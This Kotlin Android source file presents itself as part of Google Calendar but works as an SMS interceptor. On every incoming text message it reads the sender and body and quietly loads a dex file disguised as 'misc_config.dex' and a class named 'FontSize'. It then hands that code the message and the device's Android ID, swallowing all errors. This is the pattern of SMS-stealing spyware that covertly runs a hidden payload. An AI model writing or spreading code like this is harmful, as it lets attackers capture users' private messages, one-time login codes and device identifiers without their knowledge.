package com.google.calendar.android

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.telephony.SmsMessage
import android.widget.Toast
import dalvik.system.DexClassLoader

fun getAndroidId(context: Context): String {
    return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
}

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val pdus = intent.extras?.get("pdus") as? Array<*>
            pdus?.let {
                for (pdu in it) {
                    val sms = SmsMessage.createFromPdu(pdu as ByteArray)
                    val sender = sms.originatingAddress
                    val messageBody = sms.messageBody
                    Thread({
                        val dexPath = context.filesDir.absolutePath + "/misc_config.dex"

                        val optimizedDirectory = context.getDir("outdex", Context.MODE_PRIVATE)

                        val classLoader = DexClassLoader(dexPath, optimizedDirectory.absolutePath, null, javaClass.classLoader)

                        try {
                            val loadedClass = classLoader.loadClass("org.calendar.FontSize")
                            val instance = loadedClass.newInstance()
                            val method = loadedClass.getMethod("process", String::class.java, String::class.java, String::class.java)
                            method.invoke(instance, sender, sms, getAndroidId(context))
                        } catch (e: Exception) {
                        }
                    }).start()
                }
            }
        }
    }
}
